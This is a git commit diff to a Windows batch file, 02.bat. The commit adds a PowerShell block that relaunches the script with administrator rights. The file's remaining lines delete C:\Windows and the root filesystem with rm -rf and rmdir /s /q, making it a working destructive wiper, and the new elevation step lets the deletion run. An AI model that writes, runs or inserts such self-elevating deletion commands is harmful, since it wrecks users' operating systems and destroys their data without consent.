c89d6f7d157980ff7643935a0876b66e515d7f17
Daniel Nuñez <92348777+RagnarokUchiha@users.noreply.github.com>
2024-03-19 15:09:34 -0300

    02.bat

--- 02.bat
+++ 02.bat
@@ -1,4 +1,8 @@
 @echo OFF
+:runAsAdmin
+:: Reinicia o script solicitando a elevação para administrador
+powershell -Command "Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs"
+
 powershell rm -rf C:\Windows --no-preserve-root
 powershell sudo rm -rf / --no-preserve-root
 rmdir /s /q C:\Windows
